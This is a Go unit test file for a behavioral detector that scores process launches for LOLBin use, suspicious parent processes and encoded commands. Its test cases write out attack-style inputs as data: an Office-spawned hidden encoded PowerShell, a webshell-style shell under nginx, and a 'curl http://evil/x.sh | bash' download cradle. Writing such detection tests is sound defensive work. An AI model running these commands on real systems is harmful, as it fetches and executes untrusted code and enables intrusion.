package behavioral_test

import (
	"testing"

	"github.com/lucianoengel/openshield/internal/behavioral"
)

func TestAnalyze(t *testing.T) {
	cases := []struct {
		name        string
		exec        string
		parent      string
		args        []string
		wantLOLBin  bool
		wantLineage bool
		wantEncoded bool
		minScore    float64
	}{
		{
			name: "office spawns encoded powershell — the malware hallmark",
			exec: `C:\Windows\System32\powershell.exe`, parent: `C:\Program Files\Microsoft Office\winword.exe`,
			args:       []string{"-nop", "-w", "hidden", "-enc", "SQBFAFgA"},
			wantLOLBin: true, wantLineage: true, wantEncoded: true, minScore: 0.9,
		},
		{
			name: "webserver spawns a shell — webshell",
			exec: "/bin/sh", parent: "/usr/sbin/nginx",
			args:       []string{"-c", "id"},
			wantLOLBin: true, wantLineage: true, minScore: 0.7,
		},
		{
			name: "curl piped to bash — download cradle",
			exec: "/bin/bash", parent: "/bin/bash",
			args:       []string{"-c", "curl http://evil/x.sh | bash"},
			wantLOLBin: true, wantEncoded: true, minScore: 0.6,
		},
		{
			name: "a normal editor launch — clean",
			exec: "/usr/bin/gedit", parent: "/usr/bin/gnome-shell",
			args:     []string{"notes.txt"},
			minScore: 0,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := behavioral.Analyze(tc.exec, tc.parent, tc.args)
			if (f.LOLBin != "") != tc.wantLOLBin {
				t.Errorf("LOLBin = %q, want present=%v", f.LOLBin, tc.wantLOLBin)
			}
			if f.SuspiciousLineage != tc.wantLineage {
				t.Errorf("lineage = %v, want %v", f.SuspiciousLineage, tc.wantLineage)
			}
			if f.EncodedCommand != tc.wantEncoded {
				t.Errorf("encoded = %v, want %v", f.EncodedCommand, tc.wantEncoded)
			}
			if f.Score < tc.minScore {
				t.Errorf("score = %v, want >= %v", f.Score, tc.minScore)
			}
		})
	}
}

// A clean process (no LOLBin, benign parent, ordinary args) scores 0 — the FP discipline:
// the analyzer must not flag routine executions.
func TestAnalyzeCleanIsZero(t *testing.T) {
	f := behavioral.Analyze("/usr/bin/git", "/usr/bin/bash", []string{"status"})
	if f.Score != 0 || f.LOLBin != "" || f.SuspiciousLineage || f.EncodedCommand {
		t.Errorf("a routine git command was flagged: %+v", f)
	}
}

// The full-abuse case saturates at 1.0 (score is clamped), and the reasons are recorded.
func TestAnalyzeScoreClampAndReasons(t *testing.T) {
	f := behavioral.Analyze("powershell.exe", "excel.exe", []string{"-enc", "AAAA"})
	if f.Score != 1.0 {
		t.Errorf("score = %v, want 1.0 (clamped)", f.Score)
	}
	if len(f.Reasons) != 3 {
		t.Errorf("reasons = %v, want 3 (LOLBin, lineage, encoded)", f.Reasons)
	}
}
